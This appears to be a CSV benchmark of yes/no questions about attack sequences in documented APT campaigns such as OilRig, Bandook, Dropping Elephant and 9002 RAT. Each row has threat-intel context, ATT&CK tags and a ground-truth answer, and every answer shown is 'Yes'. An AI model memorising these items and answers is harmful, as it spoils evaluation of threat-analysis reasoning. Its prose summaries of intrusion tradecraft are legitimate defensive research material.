Question ID,AttackSeq ID,Batch ID,Question,Key Points,Context,Ground Truth,Source
268,134,134-Initial Access-T1190-Exploit Public-Facing Application,"After utilizing Microsoft Word documents to exploit CVE-2017-0199 for initial access, is it likely that the attack executed the embedded .hta file using mshta.exe before achieving persistence by scheduling a task named 'GoogleUpdateTasksMachineUI' to execute a VBS file every 3 minutes?","Initial Access: From April 19-24, 2017, a targeted campaign was carried out against Israeli organizations. The attack was delivered through compromised email accounts at Ben-Gurion University, using Microsoft Word documents that exploited the CVE-2017-0199 vulnerability to install a fileless variant of the Helminth Trojan agent. The Word document was sent as a reply to legitimate emails from those accounts and was propagated to more than 250 individuals in different Israeli companies.","Execution: The attack utilized a vulnerability exploit rather than macros. The .hta file delivered by the embedded link in the Word document was executed by mshta.exe, which typically shows a warning message. However, the attack disabled this message by sending an 'Enter' command to the warning window.
Persistence: The Helminth Trojan agent achieved persistence by adding a scheduled task named 'GoogleUpdateTasksMachineUI', which executes a VBS file every 3 minutes. The files are installed in the Public\Libraries\RecordedTV\ folder.
Defense Evasion: The Helminth Trojan agent used various evasive mechanisms, including the regeneration of its signatures on the infected computer to slow down detection and remediation. The attack also utilized a sophisticated version of the Mimikatz script to gather information while avoiding detection.
Credential Access: The bat script used in the attack is a customized version of Mimikatz, designed to gather information from the computer and the network. It includes commands to handle non-ASCII characters and validate the scheduled task added by the persistence mechanism.
Command and Control: The DnE1.Ps1 file communicates with a C&C server using DNS exchange queries, which is difficult to block. The server, vpsupdate[.]tk, was first registered on April 16, 2017. The script's goal is to download a bat script, execute it, and upload the results back to the C&C, clearing traces afterward.
Others: The C&C servers are still active and will be listed in the report. The attack is attributed to an Iranian hacker group responsible for the OilRig malware campaigns. The group is speculated to be sponsored by the Iranian government. The attack's sophistication has increased, with improvements in infrastructure, delivery servers, and the Helminth agent. The attackers set up the attack quickly, speculating that the window of opportunity between patch release and patch rollout was still open.",Yes,Iranian Fileless Attack Infiltrates Israeli Organizations
272,134,134-Command and Control-T1105-Ingress Tool Transfer,"After the Helminth Trojan agent uses a customized version of Mimikatz to gather information from the computer and the network, is it likely that the DnE1.Ps1 file will use DNS exchange queries to communicate with a C&C server and download a bat script for execution?","Command and Control: The DnE1.Ps1 file communicates with a C&C server using DNS exchange queries, which is difficult to block. The server, vpsupdate[.]tk, was first registered on April 16, 2017. The script's goal is to download a bat script, execute it, and upload the results back to the C&C, clearing traces afterward.","Initial Access: From April 19-24, 2017, a targeted campaign was carried out against Israeli organizations. The attack was delivered through compromised email accounts at Ben-Gurion University, using Microsoft Word documents that exploited the CVE-2017-0199 vulnerability to install a fileless variant of the Helminth Trojan agent. The Word document was sent as a reply to legitimate emails from those accounts and was propagated to more than 250 individuals in different Israeli companies.
Execution: The attack utilized a vulnerability exploit rather than macros. The .hta file delivered by the embedded link in the Word document was executed by mshta.exe, which typically shows a warning message. However, the attack disabled this message by sending an 'Enter' command to the warning window.
Persistence: The Helminth Trojan agent achieved persistence by adding a scheduled task named 'GoogleUpdateTasksMachineUI', which executes a VBS file every 3 minutes. The files are installed in the Public\Libraries\RecordedTV\ folder.
Defense Evasion: The Helminth Trojan agent used various evasive mechanisms, including the regeneration of its signatures on the infected computer to slow down detection and remediation. The attack also utilized a sophisticated version of the Mimikatz script to gather information while avoiding detection.
Credential Access: The bat script used in the attack is a customized version of Mimikatz, designed to gather information from the computer and the network. It includes commands to handle non-ASCII characters and validate the scheduled task added by the persistence mechanism.
Others: The C&C servers are still active and will be listed in the report. The attack is attributed to an Iranian hacker group responsible for the OilRig malware campaigns. The group is speculated to be sponsored by the Iranian government. The attack's sophistication has increased, with improvements in infrastructure, delivery servers, and the Helminth agent. The attackers set up the attack quickly, speculating that the window of opportunity between patch release and patch rollout was still open.",Yes,Iranian Fileless Attack Infiltrates Israeli Organizations
276,135,135-Execution-T1059-Command and Scripting Interpreter,"After delivering a malicious Microsoft Word document inside a ZIP file to achieve initial access, is it likely that the 'fmx.ps1' PowerShell script will decode and execute the base64 encoded script stored in 'sdmc.jpg' before the PowerShell script downloads a zip file containing components for the malware payload?","Execution: The execution phase involves the 'fmx.ps1' PowerShell script, which decodes and executes another base64 encoded PowerShell script stored in 'sdmc.jpg'. This script then downloads a zip file containing four files from a cloud service like Dropbox, Bitbucket, or an S3 bucket. The files 'a.png', 'b.png', and 'untitled.png' are used to generate the malware payload. 'untitled.png' contains a hidden RC4 function encoded in the pixels, created using invoke-PSImage. The final executable payload is assembled from decrypted 'a.png' and 'b.png' as is. The PowerShell script then executes the malware, opens 'draft.docx' (a benign document to mislead the victim), and cleans up the artifacts.","Initial Access: The initial access in the Bandook campaign begins with a malicious Microsoft Word document delivered inside a ZIP file. This document contains encrypted script data and an external template that points to another document with malicious VBA macros. The external template is downloaded via URL shortening services like TinyURL or Bitly, which then redirects to a domain controlled by the attacker. The VBA code within the external template decrypts the embedded data from the original document and drops it into two files: 'fmx.ps1' (PowerShell script) and 'sdmc.jpg' (base64 encoded PowerShell code). The themes of the lure documents often relate to cloud-based services such as Office365, OneDrive, and Azure, with images suggesting additional documents are available upon enabling macros. One document even depicted an Office365 logo and a preview of a certificate issued by the government of Dubai, specifically mentioning JAFZA - Jebel Ali Free Zone.
Defense Evasion: The Bandook campaign employs various techniques to hinder analysis and detection. The attackers switch the malicious external template to a benign one after a certain amount of time. The malware payload is generated using image files to conceal its components, and the final Bandook payload is signed with valid certificates from Certum to appear trustworthy.
Command and Control: The Bandook loader, written in Delphi, uses the Process Hollowing technique to inject a malicious payload into a new instance of an Internet Explorer process. The payload then contacts the C&C server, sends basic information about the infected machine, and awaits further commands. The communication protocol with the C&C server has been upgraded to use AES encryption.
Others: The Bandook malware has a history dating back to 2007 and was developed by an individual nicknamed PrinceAli. Over time, the malware became publicly available for download. The variant used in the recent attacks is a slimmed-down version with only 11 supported commands, including file operations, taking screenshots, and file download/upload/execution. The campaign targets a wide range of sectors and locations, suggesting that the malware is part of an offensive infrastructure sold to governments and threat actors worldwide. The campaign shares similarities with previous campaigns attributed to the Lebanese General Security Directorate, known as 'Dark Caracal'. The operators behind the infrastructure of 'Operation Manul' and 'Dark Caracal' are believed to still be active and operational.",Yes,Bandook_ Signed & Delivered - Check Point Research
280,135,135-Command and Control-T1573-Encrypted Channel,"After employing image files to conceal malicious components during the Defense Evasion phase, is the Bandook campaign likely to use the Process Hollowing technique within Internet Explorer to inject a malicious payload before employing AES encryption for communication with the C&C server?","Command and Control: The Bandook loader, written in Delphi, uses the Process Hollowing technique to inject a malicious payload into a new instance of an Internet Explorer process. The payload then contacts the C&C server, sends basic information about the infected machine, and awaits further commands. The communication protocol with the C&C server has been upgraded to use AES encryption.","Initial Access: The initial access in the Bandook campaign begins with a malicious Microsoft Word document delivered inside a ZIP file. This document contains encrypted script data and an external template that points to another document with malicious VBA macros. The external template is downloaded via URL shortening services like TinyURL or Bitly, which then redirects to a domain controlled by the attacker. The VBA code within the external template decrypts the embedded data from the original document and drops it into two files: 'fmx.ps1' (PowerShell script) and 'sdmc.jpg' (base64 encoded PowerShell code). The themes of the lure documents often relate to cloud-based services such as Office365, OneDrive, and Azure, with images suggesting additional documents are available upon enabling macros. One document even depicted an Office365 logo and a preview of a certificate issued by the government of Dubai, specifically mentioning JAFZA - Jebel Ali Free Zone.
Execution: The execution phase involves the 'fmx.ps1' PowerShell script, which decodes and executes another base64 encoded PowerShell script stored in 'sdmc.jpg'. This script then downloads a zip file containing four files from a cloud service like Dropbox, Bitbucket, or an S3 bucket. The files 'a.png', 'b.png', and 'untitled.png' are used to generate the malware payload. 'untitled.png' contains a hidden RC4 function encoded in the pixels, created using invoke-PSImage. The final executable payload is assembled from decrypted 'a.png' and 'b.png' as is. The PowerShell script then executes the malware, opens 'draft.docx' (a benign document to mislead the victim), and cleans up the artifacts.
Defense Evasion: The Bandook campaign employs various techniques to hinder analysis and detection. The attackers switch the malicious external template to a benign one after a certain amount of time. The malware payload is generated using image files to conceal its components, and the final Bandook payload is signed with valid certificates from Certum to appear trustworthy.
Others: The Bandook malware has a history dating back to 2007 and was developed by an individual nicknamed PrinceAli. Over time, the malware became publicly available for download. The variant used in the recent attacks is a slimmed-down version with only 11 supported commands, including file operations, taking screenshots, and file download/upload/execution. The campaign targets a wide range of sectors and locations, suggesting that the malware is part of an offensive infrastructure sold to governments and threat actors worldwide. The campaign shares similarities with previous campaigns attributed to the Lebanese General Security Directorate, known as 'Dark Caracal'. The operators behind the infrastructure of 'Operation Manul' and 'Dark Caracal' are believed to still be active and operational.",Yes,Bandook_ Signed & Delivered - Check Point Research
284,136,136-Defense Evasion-T1027-Obfuscated Files or Information,"After employing spear-phishing and watering hole attacks to gain initial access, is it likely that the Dropping Elephant threat actor will use UPX-packed backdoor malware to download additional malicious artifacts before evading detection by decoding the encoded blobs?","Defense Evasion: The backdoor downloads encoded blobs that are decoded to PowerShell command line scripts, which are then executed to download additional malware. This method of using encoded blobs helps evade detection.","Reconnaissance: The Dropping Elephant threat actor, also known as Chinastrats and Patchwork, has been observed targeting high-profile diplomatic and economic entities with a focus on China's foreign relations. The adversaries employ spear-phishing and watering hole attacks to gather information and compromise victims.
Initial Access: Dropping Elephant uses spear-phishing with documents containing remote content that sends a 'ping' to the attackers' server upon opening. A subsequent spear-phishing email with an MS Word document exploiting CVE-2012-0158 or a PowerPoint document exploiting CVE-2014-6352 is sent. They also use watering hole attacks with a website that downloads genuine news articles and requires downloading a PowerPoint document to view the entire article, which contains a malicious artifact.
Execution: The backdoor used by Dropping Elephant is UPX packed and downloads additional malware from the C2 server, including encoded blobs that are decoded to PowerShell command line scripts.
Credential Access: The backdoor steals the user's Google Chrome credentials among other data.
Collection: The file-stealer module iterates through directories to collect files with specific extensions (doc, docx, ppt, pptx, pps, ppsx, xls, xlsx, pdf) and uploads them to the C2 server.
Command and Control: The backdoor pings the C2 server at regular intervals, which can be spotted by analyzing firewall log files. The group also uses resilient communications, hiding encrypted C2 server locations in comments on legitimate websites.
Others: The Dropping Elephant artifacts are detected by Kaspersky Lab products under various signatures. Kaspersky Lab collaborates with CERTs and LEAs to notify victims and mitigate the threat. Indicators of Compromise (IoCs) include a list of backdoors, exploit documents, domains, IPs, and C2 redirectors.",Yes,The Dropping Elephant actor - Securelist
287,136,136-Command and Control-T1071-Application Layer Protocol,"After the backdoor steals Google Chrome credentials, is it likely that it will ping the C2 server at regular intervals before collecting and uploading targeted file types, such as doc, docx, and pdf, to the same server?","Command and Control: The backdoor pings the C2 server at regular intervals, which can be spotted by analyzing firewall log files. The group also uses resilient communications, hiding encrypted C2 server locations in comments on legitimate websites.","Reconnaissance: The Dropping Elephant threat actor, also known as Chinastrats and Patchwork, has been observed targeting high-profile diplomatic and economic entities with a focus on China's foreign relations. The adversaries employ spear-phishing and watering hole attacks to gather information and compromise victims.
Initial Access: Dropping Elephant uses spear-phishing with documents containing remote content that sends a 'ping' to the attackers' server upon opening. A subsequent spear-phishing email with an MS Word document exploiting CVE-2012-0158 or a PowerPoint document exploiting CVE-2014-6352 is sent. They also use watering hole attacks with a website that downloads genuine news articles and requires downloading a PowerPoint document to view the entire article, which contains a malicious artifact.
Execution: The backdoor used by Dropping Elephant is UPX packed and downloads additional malware from the C2 server, including encoded blobs that are decoded to PowerShell command line scripts.
Defense Evasion: The backdoor downloads encoded blobs that are decoded to PowerShell command line scripts, which are then executed to download additional malware. This method of using encoded blobs helps evade detection.
Credential Access: The backdoor steals the user's Google Chrome credentials among other data.
Collection: The file-stealer module iterates through directories to collect files with specific extensions (doc, docx, ppt, pptx, pps, ppsx, xls, xlsx, pdf) and uploads them to the C2 server.
Others: The Dropping Elephant artifacts are detected by Kaspersky Lab products under various signatures. Kaspersky Lab collaborates with CERTs and LEAs to notify victims and mitigate the threat. Indicators of Compromise (IoCs) include a list of backdoors, exploit documents, domains, IPs, and C2 redirectors.",Yes,The Dropping Elephant actor - Securelist
288,136,136-Reconnaissance-T1589-Gather Victim Identity Information,"After targeting diplomatic and economic entities to gather victim identity information, is it likely that Dropping Elephant will use spear-phishing emails containing malicious documents to gain initial access before executing UPX-packed backdoors to download additional malware?","Reconnaissance: The Dropping Elephant threat actor, also known as Chinastrats and Patchwork, has been observed targeting high-profile diplomatic and economic entities with a focus on China's foreign relations. The adversaries employ spear-phishing and watering hole attacks to gather information and compromise victims.","Initial Access: Dropping Elephant uses spear-phishing with documents containing remote content that sends a 'ping' to the attackers' server upon opening. A subsequent spear-phishing email with an MS Word document exploiting CVE-2012-0158 or a PowerPoint document exploiting CVE-2014-6352 is sent. They also use watering hole attacks with a website that downloads genuine news articles and requires downloading a PowerPoint document to view the entire article, which contains a malicious artifact.
Execution: The backdoor used by Dropping Elephant is UPX packed and downloads additional malware from the C2 server, including encoded blobs that are decoded to PowerShell command line scripts.
Defense Evasion: The backdoor downloads encoded blobs that are decoded to PowerShell command line scripts, which are then executed to download additional malware. This method of using encoded blobs helps evade detection.
Credential Access: The backdoor steals the user's Google Chrome credentials among other data.
Collection: The file-stealer module iterates through directories to collect files with specific extensions (doc, docx, ppt, pptx, pps, ppsx, xls, xlsx, pdf) and uploads them to the C2 server.
Command and Control: The backdoor pings the C2 server at regular intervals, which can be spotted by analyzing firewall log files. The group also uses resilient communications, hiding encrypted C2 server locations in comments on legitimate websites.
Others: The Dropping Elephant artifacts are detected by Kaspersky Lab products under various signatures. Kaspersky Lab collaborates with CERTs and LEAs to notify victims and mitigate the threat. Indicators of Compromise (IoCs) include a list of backdoors, exploit documents, domains, IPs, and C2 redirectors.",Yes,The Dropping Elephant actor - Securelist
289,136,136-Credential Access-T1555-Credentials from Password Stores,"After evading defenses by decoding encoded blobs into PowerShell command line scripts to download additional malware, is the Dropping Elephant backdoor likely to iterate through password stores and steal the user's Google Chrome credentials?",Credential Access: The backdoor steals the user's Google Chrome credentials among other data.,"Reconnaissance: The Dropping Elephant threat actor, also known as Chinastrats and Patchwork, has been observed targeting high-profile diplomatic and economic entities with a focus on China's foreign relations. The adversaries employ spear-phishing and watering hole attacks to gather information and compromise victims.
Initial Access: Dropping Elephant uses spear-phishing with documents containing remote content that sends a 'ping' to the attackers' server upon opening. A subsequent spear-phishing email with an MS Word document exploiting CVE-2012-0158 or a PowerPoint document exploiting CVE-2014-6352 is sent. They also use watering hole attacks with a website that downloads genuine news articles and requires downloading a PowerPoint document to view the entire article, which contains a malicious artifact.
Execution: The backdoor used by Dropping Elephant is UPX packed and downloads additional malware from the C2 server, including encoded blobs that are decoded to PowerShell command line scripts.
Defense Evasion: The backdoor downloads encoded blobs that are decoded to PowerShell command line scripts, which are then executed to download additional malware. This method of using encoded blobs helps evade detection.
Collection: The file-stealer module iterates through directories to collect files with specific extensions (doc, docx, ppt, pptx, pps, ppsx, xls, xlsx, pdf) and uploads them to the C2 server.
Command and Control: The backdoor pings the C2 server at regular intervals, which can be spotted by analyzing firewall log files. The group also uses resilient communications, hiding encrypted C2 server locations in comments on legitimate websites.
Others: The Dropping Elephant artifacts are detected by Kaspersky Lab products under various signatures. Kaspersky Lab collaborates with CERTs and LEAs to notify victims and mitigate the threat. Indicators of Compromise (IoCs) include a list of backdoors, exploit documents, domains, IPs, and C2 redirectors.",Yes,The Dropping Elephant actor - Securelist
290,136,136-Collection-T1119-Automated Collection,"After the backdoor used by Dropping Elephant downloads encoded blobs that are decoded to PowerShell command line scripts for defense evasion, is it likely that the file-stealer module will iterate through directories to collect files with specific extensions for automated collection?","Collection: The file-stealer module iterates through directories to collect files with specific extensions (doc, docx, ppt, pptx, pps, ppsx, xls, xlsx, pdf) and uploads them to the C2 server.","Reconnaissance: The Dropping Elephant threat actor, also known as Chinastrats and Patchwork, has been observed targeting high-profile diplomatic and economic entities with a focus on China's foreign relations. The adversaries employ spear-phishing and watering hole attacks to gather information and compromise victims.
Initial Access: Dropping Elephant uses spear-phishing with documents containing remote content that sends a 'ping' to the attackers' server upon opening. A subsequent spear-phishing email with an MS Word document exploiting CVE-2012-0158 or a PowerPoint document exploiting CVE-2014-6352 is sent. They also use watering hole attacks with a website that downloads genuine news articles and requires downloading a PowerPoint document to view the entire article, which contains a malicious artifact.
Execution: The backdoor used by Dropping Elephant is UPX packed and downloads additional malware from the C2 server, including encoded blobs that are decoded to PowerShell command line scripts.
Defense Evasion: The backdoor downloads encoded blobs that are decoded to PowerShell command line scripts, which are then executed to download additional malware. This method of using encoded blobs helps evade detection.
Credential Access: The backdoor steals the user's Google Chrome credentials among other data.
Command and Control: The backdoor pings the C2 server at regular intervals, which can be spotted by analyzing firewall log files. The group also uses resilient communications, hiding encrypted C2 server locations in comments on legitimate websites.
Others: The Dropping Elephant artifacts are detected by Kaspersky Lab products under various signatures. Kaspersky Lab collaborates with CERTs and LEAs to notify victims and mitigate the threat. Indicators of Compromise (IoCs) include a list of backdoors, exploit documents, domains, IPs, and C2 redirectors.",Yes,The Dropping Elephant actor - Securelist
291,136,136-Collection-T1074-Data Staged,"After the backdoor used by Dropping Elephant steals the user's Google Chrome credentials and other data, is it likely that the file-stealer module will iterate through directories to collect files with specific extensions and upload them to the C2 server?","Collection: The file-stealer module iterates through directories to collect files with specific extensions (doc, docx, ppt, pptx, pps, ppsx, xls, xlsx, pdf) and uploads them to the C2 server.","Reconnaissance: The Dropping Elephant threat actor, also known as Chinastrats and Patchwork, has been observed targeting high-profile diplomatic and economic entities with a focus on China's foreign relations. The adversaries employ spear-phishing and watering hole attacks to gather information and compromise victims.
Initial Access: Dropping Elephant uses spear-phishing with documents containing remote content that sends a 'ping' to the attackers' server upon opening. A subsequent spear-phishing email with an MS Word document exploiting CVE-2012-0158 or a PowerPoint document exploiting CVE-2014-6352 is sent. They also use watering hole attacks with a website that downloads genuine news articles and requires downloading a PowerPoint document to view the entire article, which contains a malicious artifact.
Execution: The backdoor used by Dropping Elephant is UPX packed and downloads additional malware from the C2 server, including encoded blobs that are decoded to PowerShell command line scripts.
Defense Evasion: The backdoor downloads encoded blobs that are decoded to PowerShell command line scripts, which are then executed to download additional malware. This method of using encoded blobs helps evade detection.
Credential Access: The backdoor steals the user's Google Chrome credentials among other data.
Command and Control: The backdoor pings the C2 server at regular intervals, which can be spotted by analyzing firewall log files. The group also uses resilient communications, hiding encrypted C2 server locations in comments on legitimate websites.
Others: The Dropping Elephant artifacts are detected by Kaspersky Lab products under various signatures. Kaspersky Lab collaborates with CERTs and LEAs to notify victims and mitigate the threat. Indicators of Compromise (IoCs) include a list of backdoors, exploit documents, domains, IPs, and C2 redirectors.",Yes,The Dropping Elephant actor - Securelist
302,139,139-Command and Control-T1071-Application Layer Protocol,"After using Windows Management Instrumentation (WMI) to register a script as a backdoor for persistence and to avoid detection through file scanning by antivirus solutions for defense evasion, is the Luckycat campaign likely to utilize free hosting services and communicate with C&C servers using HTTP over port 80 for command-and-control operations?","Command and Control: The Luckycat campaign extensively used free hosting services for command-and-control (C&C) operations, with domains registered using diverse email addresses. The attackers also maintained servers on dedicated VPS services, providing a resilient infrastructure. The malware communicated with the C&C servers using HTTP over port 80, posting data to a PHP script, usually count.php, and executing commands received from the attackers.","Initial Access: The Luckycat campaign, active since at least June 2011, targeted a variety of entities in Japan, India, and Tibetan activists. The attackers employed social engineering tactics, sending contextually relevant emails with malicious attachments that exploited vulnerabilities in popular software such as Adobe Reader and Microsoft Office. Notably, CVE-2010-3333, known as the 'Rich Text Format Stack Buffer Overflow Vulnerability', was frequently exploited. The malware used, identified as TROJ_WIMMIE or VBS_WIMMIE, leveraged Windows Management Instrumentation (WMI) for persistence and communicated with command-and-control (C&C) servers via HTTP over port 80. The attackers utilized free web-hosting services for diverse domain names but also employed Virtual Private Servers (VPSs) for more stable operations.
Persistence: The Luckycat malware, specifically TROJ_WIMMIE and VBS_WIMMIE, established persistence by using Windows Management Instrumentation (WMI) to register a script that acted as a backdoor and was undetectable through file scanning. The malware connected to a C&C server and posted data to a PHP script, usually count.php, which resulted in the creation of a file on the C&C server containing information about the compromised computer.
Defense Evasion: The Luckycat malware, TROJ_WIMMIE and VBS_WIMMIE, evaded detection by leveraging Windows Management Instrumentation (WMI) to avoid simple file scanning by antivirus software. The attackers also used proxy and anonymity tools to shield their identities and a variety of mailing programs to instigate targeted attacks.
Others: The Luckycat campaign was linked to other campaigns, including ShadowNet, Duojeen, Sparksrv, and Comfoo, indicating possible collaboration or shared infrastructure. The attackers tested their malware in a virtual environment using a Chinese-language version of Windows XP. They also used anonymity tools like Tor and Tunnelier to obscure their locations and mailing software such as FoxMail and Supermailer for sending socially engineered emails. The campaign was connected to a hacker in the Chinese underground community, known by the nicknames 'dang0102' and 'scuhkr', who had ties to the Information Security Institute of Sichuan University.",Yes,wp_luckycat_redux
305,14,14-Command and Control-T1071-Application Layer Protocol,Is it likely that the Russian-language phishing campaign exploited a vulnerability in Microsoft's Encapsulated Postscript (EPS) filter through malicious docx files containing obfuscated code before the malware established communication with a compromised server located at IP address 137.74.224[.]142 for command and control?,"Command and Control: The malware communicated with a compromised server at IP address 137.74.224[.]142, which was previously associated with a Minecraft server. The server responded with HTTP 200 and the message 'False'. The communication occurred at five-second intervals, and the server's historic DNS resolutions were examined for potential associations with previous campaigns.","Initial Access: A Russian-language phishing campaign was active during the second week of August 2017, targeting Russian banks with emails that appeared to be from disgruntled customers complaining about extra charges. The emails contained malicious attachments exploiting a vulnerability in Microsoft's Encapsulated Postscript (EPS) filter, likely CVE-2017-0262, which had been patched in April 2017. The campaign involved at least 23 attachments with names such as 'Account statement', 'Card statement', and 'Personal information'. The attachments were nearly identical, with variations in checksums possibly intended to generate unique hashes. The exploit was delivered via docx files containing an embedded EPS image file, which included obfuscated code and a multibyte XOR key. The attackers signed their malware with lyrics from Slipknot's 'Snuff' and included obfuscated comments possibly targeting Kaspersky. The campaign was brought to the attention of the Central Bank of Russia's FinCERT by one or more targeted banks.",Yes,Russian-Bank-Offices
308,140,140-Command and Control-T1090-Proxy,"After maintaining persistence through a .LNK file in the Startup directory that executes a PowerShell script to inject the downloaded 9002 RAT shellcode into a new wabmig.exe process, is the 9002 RAT likely to use fake SSL communication for Command and Control to mimic legitimate traffic to login.live[.]com?","Command and Control: The 9002 RAT communicates with its C&C using HTTP POST requests with encoded data. The encoding algorithm is an iteration of the ""4-byte XOR version of 9002"" analyzed by FireEye. The malware uses a dynamic 4-byte XOR key along with a static 38-byte seed to generate a final 256-byte XOR key. The HTTP POST requests contain hardcoded Accept and User-Agent headers, and two different hardcoded URIs are used for communication. The RAT also uses fake SSL communication, attempting to mimic legitimate SSL traffic to login.live[.]com.","Initial Access: Proofpoint detected malicious email messages on August 10, which were designed to appear as if they contained unreleased Game of Thrones content. The emails used the subject line ""Wanna see the Game of Thrones in advance?"" and included a Microsoft Word attachment named ""game of thrones preview.docx"". This document contained an embedded .LNK object that, if executed, would run a malicious PowerShell script leading to the installation of the ""9002"" RAT.
Execution: The .LNK object in the malicious email attachment executes a PowerShell command using a modified Invoke-Shellcode script to download two files obfuscated with XOR and base64. The first file contains the 9002 RAT shellcode that is injected into the legitimate Windows Mail binary wabmig.exe. The second file is a .LNK file used to maintain persistence on the infected machine. The persistence .LNK is stored in the Startup directory as UpdateCheck.lnk and contains a PowerShell script nearly identical to the .LNK downloader, but instead of downloading shellcode, it opens, decodes, and injects the already downloaded shellcode into a newly created wabmig.exe process.
Persistence: The persistence mechanism involves a .LNK file named UpdateCheck.lnk, which is stored in the Startup directory. This file contains a PowerShell script that decodes and injects the downloaded 9002 RAT shellcode into a newly created wabmig.exe process, ensuring the RAT remains active even after system restarts.
Defense Evasion: The 9002 RAT variant used in the attack is capable of communicating over HTTP and fake SSL, with hardcoded packets for Client_Hello and Client_Key_Exchange. The HTTP traffic and encoding used by this variant have several distinguishing characteristics, including data sent to the C&C in an encoded state using a custom algorithm followed by base64-encoding. The malware also attempts to mimic SSL traffic to login.live[.]com by sending that domain in the SNI field. Additionally, if the same URI is requested with any User-Agent, a legitimate JPG is returned instead of the payload, indicating an evasion technique to avoid detection by automated systems.
Others: The campaign was attributed to a state-sponsored actor, possibly the Chinese government, based on similarities with previous attacks such as Operation Aurora and Operation Ephemeral Hydra. The 9002 RAT has been historically used by these actors, and the current campaign's use of a Game of Thrones lure is consistent with the tactic of using timely and relevant lures. The attack was blocked by Proofpoint systems, but the sophistication of the delivery mechanisms and the RAT itself pose significant threats to corporate data and systems. The campaign may be connected to the Deputy Dog (APT17) actor, based on shared identifiers and similarities in code, payload, file names, images, and themes. The earliest use of the malicious LNK PowerShell downloader was identified in a file uploaded to a malicious file scanning service on July 6, 2017.",Yes,operation-rat-cook-chinese-apt-actors-use-fake-game-thrones-leaks-lures
312,141,141-Initial Access-T1566-Phishing,"After the BitterAPT group developed BitterRAT malware, is it likely that they utilized compromised websites and phishing schemes to distribute their threats before setting up Command and Control servers such as blitzchatlog.ddns.net for victim communication and data exfiltration?","Initial Access: The BitterAPT group, also known as APT-C-08, has been active since at least 2014, targeting Pakistani nationals and later expanding to China, India, and other South Asian countries, as well as Saudi Arabia. Initially, BitterAPT used the AndroRAT framework for their Android malware but later developed a custom RAT known as BitterRAT. They distributed their malware through fake applications and compromised websites, such as gandharaart[.]org, which hosted both Windows and Android versions of their threats. The group has been known to use phishing schemes and hacked sites for distribution, including spiceworld.rf[.]gd, which delivered P-Hub Premium.apk. The BitterAPT group is believed to operate out of South Asia, with activity patterns suggesting a regular workweek schedule.","Command and Control: The BitterAPT group utilized several Command and Control (CnC) servers to communicate with compromised systems. New domains were discovered, including blitzchatlog.ddns.net, playupdateapp.serveblog.net, and techfront.com.cn, which were used to exfiltrate personal data. The domain blitzchatlog.ddns.net, hosted by Leaseweb in the US, served as a resource for some applications and contained various .php files for different data services. The CnCs tracked victims using phone IMEI and SIM numbers.
Others: The BitterAPT group infiltrated Google Play with applications such as AlarmClockSlide, which shared the same package name and certificate as known BitterRAT malware. Other applications by the same developer, CreativeFox, were found on Google Play without data-exfiltration capabilities but could potentially be weaponized through updates. The applications' privacy pages pointed to the domain thew64binautoclean[.]org, which was developed with significant effort. Indicators suggest that the applications were designed to target Pakistani victims. BitterRAT has evolved to include modules for spying and stealing personal information, with capabilities to record calls, access call history, SMS, location, accounts, installed applications, documents, WhatsApp messages, and BBM messages. The malware also collects network details, IMEI, phone numbers, roaming status, and voice mail numbers. Some BitterRAT samples retrieve the CnC from a Firebase database due to improper configuration, revealing the domain flashnewsservice.org. The BitterAPT group's telemetry indicates a focus on Asian countries, with most scans coming from China, Hong Kong, and Singapore.",Yes,Bitdefender-PR-Whitepaper-BitterAPT-creat4571-en-EN-GenericUse
